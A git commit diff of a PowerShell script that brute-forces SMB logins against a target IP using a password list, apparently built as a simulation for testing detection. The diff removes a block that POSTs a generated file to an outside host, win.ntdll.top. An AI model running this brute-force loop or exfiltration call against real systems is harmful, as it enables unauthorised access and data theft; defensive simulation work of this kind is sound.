999720d6b63d43f4b6999c7d00338db417e57b54
wbbigdave <Luke@wbbigdave.com>
2020-10-08 17:27:48 +0100

    Update SMB_Brute_Force.ps1

--- SMB_Brute_Force.ps1
+++ SMB_Brute_Force.ps1
@@ -1,10 +1,6 @@
  $target = '10.254.100.99' #this is the smb target, use IP or hostname
 $pass = 'passwords.txt' #create list of passwords to brute force with, change this variable to the location of that text file.
 $user = 'Admin' #local username of the machine that is the smb target, in this case it is just admin even though that account does not exist on the target machine.
-$fileSize = 1048576 # size in bytes, this is 1MB
-$filename = 'testfile.zip' # name of the test file that is generated and transfered
-$uri = 'http://win.ntdll.top:8080'# url to attempt http exfil
-$uploadPath = '/files'# route to try upload to 
 $counter = 0 # do not touch 
 $passcount = (Get-Content $pass).Length # donot touch
 
@@ -13,7 +9,7 @@ Write-Host "Senario 1: SMB Brute Force"
 foreach($ps in Get-Content $pass) {
 
     Write-Progress -Activity 'Testing SMB Brute Force' -CurrentOperation $ps -PercentComplete ((($counter++) / $passcount) * 100)
-    $u = $user -replace "^\.\\", "$host\"
+    $u = "$target\$user"
     try {
 
         if (new-smbmapping -remotepath \\$target -username $u -password $ps -EA SilentlyContinue) {
@@ -33,14 +29,3 @@ foreach($ps in Get-Content $pass) {
     }
 
 } 
-
-Write-Host "Senario 2: File Exfiltration"
-
-
- 
-
-$out = new-object byte[] $fileSize; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes($filename, $out)
-
-Invoke-RestMethod -Uri $uri -Method Post -InFile $filename -EA SilentlyContinue
-
-Remove-Item $filename
